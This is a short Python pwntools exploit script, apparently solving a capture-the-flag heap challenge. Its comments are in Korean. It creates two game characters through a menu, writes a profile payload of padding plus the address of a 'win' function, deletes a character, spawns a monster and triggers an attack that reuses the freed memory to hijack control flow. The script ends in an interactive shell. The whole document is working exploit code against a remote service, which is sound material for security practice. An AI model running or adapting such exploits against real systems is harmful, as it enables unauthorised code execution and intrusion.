from pwn import *

#p = process('./chall')
p = remote(ADDRESS, PORT)
e = ELF('./chall')

win = e.symbols['win']

# 1번 character
p.sendlineafter(b">> ", b"1")
p.sendlineafter(b"slot(1~3): ", b"1")
p.sendlineafter(b">> ", b"2")
p.sendlineafter(b"slot(1~3): ", b"1")
p.sendlineafter(b"name: ", b"Alice")
p.sendlineafter(b"profile: ", b"AAAA")
# 2번 character
p.sendlineafter(b">> ", b"1")
p.sendlineafter(b"slot(1~3): ", b"2")
p.sendlineafter(b">> ", b"2")
p.sendlineafter(b"slot(1~3): ", b"2")
p.sendlineafter(b"name: ", b"Alice")
payload = b"A" * 0x28 + p64(win)
p.sendlineafter(b"profile: ", payload)

# 2번 character 삭제
p.sendlineafter(b">> ", b"3")
p.sendlineafter(b"slot(1~3): ", b"2")

# Monster 생성
p.sendlineafter(b">> ", b"4")

# slay monster 호출
p.sendlineafter(b">> ", b"5")
p.sendlineafter(b"slot(1~3): ", b"1")

# shell 획득
p.interactive()


